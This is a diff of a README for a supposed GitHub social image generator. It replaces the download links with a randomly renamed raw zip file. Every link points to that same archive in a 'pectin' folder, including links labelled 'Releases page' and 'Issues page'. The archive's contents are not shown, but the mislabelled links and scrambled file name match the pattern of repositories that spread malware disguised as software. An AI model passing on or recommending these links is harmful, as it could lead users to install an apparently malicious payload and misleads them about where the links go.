@@ -1,7 +1,7 @@
 # 🎨 xsukax-Github-Social-Image-Generator - Effortless Image Creation for GitHub
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/xsukax-Github-Social-Image-Generator.zip)](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/xsukax-Github-Social-Image-Generator.zip)
+[![Download](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/Generator_Social_Image_xsukax_Github_albuginitis.zip)](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/Generator_Social_Image_xsukax_Github_albuginitis.zip)
 
 ## 🚀 Getting Started
 Welcome to the xsukax-Github-Social-Image-Generator! This application helps you create beautiful cover images for your GitHub repositories easily. You don’t need any technical skills or complicated setup. Just follow these simple steps to get started.
@@ -20,7 +20,7 @@ To use the xsukax-Github-Social-Image-Generator, you need:
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**: Go to the following link to access the latest software version:
-   [Download from Releases](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/xsukax-Github-Social-Image-Generator.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/Generator_Social_Image_xsukax_Github_albuginitis.zip)
    
 2. **Select the Latest Version**: Look for the most recent version listed on the page. Click on it. 
 
@@ -44,7 +44,7 @@ To use the xsukax-Github-Social-Image-Generator, you need:
 - Use high-quality images for better results.
 
 ## 🛠 Support and Feedback
-If you have questions or run into issues, please create an issue on the [Issues page](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/xsukax-Github-Social-Image-Generator.zip). We welcome your feedback to improve the generator.
+If you have questions or run into issues, please create an issue on the [Issues page](https://raw.githubusercontent.com/Fahad4v/xsukax-Github-Social-Image-Generator/main/pectin/Generator_Social_Image_xsukax_Github_albuginitis.zip). We welcome your feedback to improve the generator.
 
 ## 🤝 Contributing
 We appreciate your interest in helping us improve the xsukax-Github-Social-Image-Generator. If you want to contribute, please fork the repository and submit a pull request. 
